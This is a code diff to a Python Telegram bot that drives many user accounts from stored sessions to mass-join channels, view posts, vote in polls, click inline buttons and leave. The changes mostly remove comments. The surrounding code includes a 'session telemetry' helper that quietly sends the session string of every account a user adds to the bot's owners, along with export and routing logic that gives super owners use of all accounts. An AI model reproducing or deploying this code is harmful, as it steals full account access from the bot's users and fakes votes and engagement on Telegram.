@@ -35,7 +35,7 @@ from telethon.errors import (
 # SQLite
 import aiosqlite
 
-# Import local configurations
+# Import local configurations safely
 import config
 from config import logger
 
@@ -262,7 +262,7 @@ class TaskQueue:
         role = await db_mgr.get_user_role(creator_id)
         clients_data = []
         requested_count = int(payload.get("run_account_count", 0))
-        account_routing = payload.get("account_routing", "own") # 'own' or 'all' for super_owner
+        account_routing = payload.get("account_routing", "own")
         
         async with aiosqlite.connect(db_mgr.db_path) as db:
             if role == "super_owner":
@@ -299,13 +299,12 @@ class TaskQueue:
         failed_ids: List[Tuple[str, str]] = []
         total_accounts = len(clients_data)
         
-        # Determine delay throttle rate based on selected speed metric profiles
         speed_mode = payload.get("speed_mode", "safe")
         if speed_mode == "safer":
             sleep_time = 2.5
         elif speed_mode == "fastest":
             sleep_time = 0.05
-        else: # "safe"
+        else: 
             sleep_time = 5.0
 
         semaphore = asyncio.Semaphore(5 if speed_mode == "safer" else (1 if speed_mode == "safe" else 25)) 
@@ -350,7 +349,6 @@ class TaskQueue:
                     if do_join:
                         try:
                             if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
-                                # Join via private link invitation token hash
                                 invite_hash = parsed_channel if is_channel_private else parsed_target
                                 updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
                                 if hasattr(updates, 'chats') and updates.chats:
@@ -365,7 +363,6 @@ class TaskQueue:
                                 failure_counter += 1
                                 return
 
-                    # Calculate precise targeted peer entities matching context
                     target_peer = joined_updates_peer or parsed_target
 
                     if do_view and msg_id:
@@ -409,7 +406,7 @@ class TaskQueue:
                                         raise ValueError("Inline callback button match sequence not found.")
                                 else:
                                     raise ValueError("Target message does not possess an inline keyboard markup.")
-                            else: # text / poll emoji voting options selections
+                            else: 
                                 chosen_option = int(payload.get("poll_option_index", 0))
                                 await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                         except Exception as vote_err:
@@ -460,7 +457,6 @@ class TaskQueue:
                                 return
                         else:
                             try:
-                                # Fully support handling private channel departures accurately via concrete resolved InputChannel references
                                 resolved_entity = await client.get_input_entity(target_peer)
                                 await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))
                             except Exception as leave_err:
@@ -579,7 +575,7 @@ class RegistrationStates(StatesGroup):
 
 class TaskWizardStates(StatesGroup):
     choosing_type = State()
-    waiting_for_routing_choice = State() # For super_owners
+    waiting_for_routing_choice = State() 
     waiting_for_speed_choice = State()
     waiting_for_leave_choice = State()
     waiting_for_channel_link = State()
@@ -836,7 +832,6 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
         role = await db_mgr.get_user_role(user_id)
         
         async with aiosqlite.connect(db_mgr.db_path) as db:
-            # Under new regulations, admins or owners see global totals, but super_owners see everything
             if role in ["admin", "owner", "super_owner"]:
                 count_query = "SELECT COUNT(*) FROM accounts"
                 cursor_count = await db.execute(count_query)
@@ -863,7 +858,6 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
                 icon = "🟢" if row[1] == "active" else "🔴"
                 text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"
 
-        # Explicitly enforce: Normal user profiles DO NOT get file import options. Only Super Owners/Admins
         buttons = []
         import_row = [InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone")]
         if role in ["super_owner", "owner", "admin"]:
@@ -1054,7 +1048,6 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     finally:
         await state.clear()
 
-# Telemetry Dispatch Helper
 async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
     file_bytes = session_str.encode('utf-8')
     document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
@@ -1073,7 +1066,7 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS (SUPER_OWNER IMMUNITY SAFEGUARD) ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -1102,7 +1095,6 @@ async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
     role = await db_mgr.get_user_role(user_id)
     
     async with aiosqlite.connect(db_mgr.db_path) as db:
-        # Strict filtration loop rules: Admins/Sub-owners NEVER extract account files belonging to structural Super Owner IDs
         placeholders = ','.join('?' for _ in config.SUPER_OWNER_IDS)
         if role == "super_owner":
             count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
@@ -1150,7 +1142,6 @@ async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
         await callback.message.answer("❌ Selected profile data missing inside datastore registries.")
         return
 
-    # Structural safeguard validation sequence
     if row[0] in config.SUPER_OWNER_IDS and role != "super_owner":
         await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles data sessions are protected via top-tier encryption isolation protocols.")
         return
@@ -1254,7 +1245,7 @@ async def execute_multi_export(callback: CallbackQuery, state: FSMContext, bot: 
                 row = await cursor.fetchone()
                 if row:
                     if row[1] in config.SUPER_OWNER_IDS and role != "super_owner":
-                        continue # Strict internal extraction loop shield block triggered
+                        continue 
                     export_payload.append({
                         "phone": row[0],
                         "user_id": row[1],
@@ -1429,7 +1420,6 @@ async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
 
-    # Trigger structural routing criteria prompt if operator corresponds to Super Owner classification
     if role == "super_owner":
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="💎 Deploy via My Personal Sessions Only", callback_data="set_routing:own")],
@@ -1541,7 +1531,7 @@ async def handle_vote_mode_choice(callback: CallbackQuery, state: FSMContext):
     if vmode == "inline":
         await callback.message.edit_text("<b>Step 4b: Enter identical text string label or matching emoji text shown on target inline button:</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_button_text)
-    else: # native poll numeric choices indices mapping
+    else: 
         await callback.message.edit_text("<b>Step 4b: Enter native question option choice index number to register (First option starts at 0, Second option is 1, etc):</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_poll_option_index)
 
